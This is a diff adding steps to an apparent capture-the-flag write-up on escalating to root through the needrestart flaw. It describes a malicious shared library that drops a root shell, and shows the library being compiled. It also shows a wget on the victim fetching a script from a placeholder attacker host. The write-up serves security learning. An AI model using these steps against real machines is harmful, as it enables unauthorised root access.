@@ -395,4 +395,36 @@ fismathack@conversor:~$ /usr/sbin/needrestart -v
 
 Since its exploitable, we can craft an exploit for this machine. These articles help get an understanding how how to start. [Qualy's](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt) [LinuxSecurity](https://linuxsecurity.com/news/security-vulnerabilities/linux-needrestart-utility-flaws-allow-root-access) [ally-petitt](https://github.com/ally-petitt/CVE-2024-48990-Exploit/blob/main/README.md)
 
-The `lib.c` file is a malicious shared library payload. It’s written so a function runs automatically when the library is loaded; if that function finds it’s running as root it drops a copy of a root shell into `/tmp` makes that copy SUID so it runs with root privileges leading to easy way for anyone with access to the machine to gain root.
+The `lib.c` file is a malicious pre-compiled `.so` payload. It’s written so a function runs automatically when the library is loaded; if that function finds it’s running as root, it drops a copy of a root shell into `/tmp`.
+
+The second part to the exploit is creating some autonomy. Creating the `autoRun.sh` is optional but makes the execution simpler. 
+
+Before that we need to compile the `lib.c` file into a shared library (`.so`) file. 
+
+```
+┌──(root㉿kali)-[/]
+└─# gcc -shared -fPIC -o __init__.so lib.c
+```
+
+Making sure the `autoRun.sh` file is in the same directory as the `__init__.so` file we can host a http server on our attacker machine. 
+
+Then, back on the victim machine we run `wget` to download the `autoRun.sh` file.
+
+```
+┌──(root㉿kali)-[/]
+└─# python3 -m http.sever 8000
+```
+
+```
+fismathack@conversor:/tmp$ wget http://<attacker ip>:8000/runner.sh
+--2025-11-03 01:31:55--  http://<attacker ip>:8000/runner.sh
+Connecting to <attacker ip>:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 451 [application/x-sh]
+Saving to: ‘runner.sh’
+
+runner.sh                        100%[=========================================================>]     451  --.-KB/s    in 0s      
+
+2025-11-03 01:31:55 (22.8 MB/s) - ‘runner.sh’ saved [451/451]
+```
+
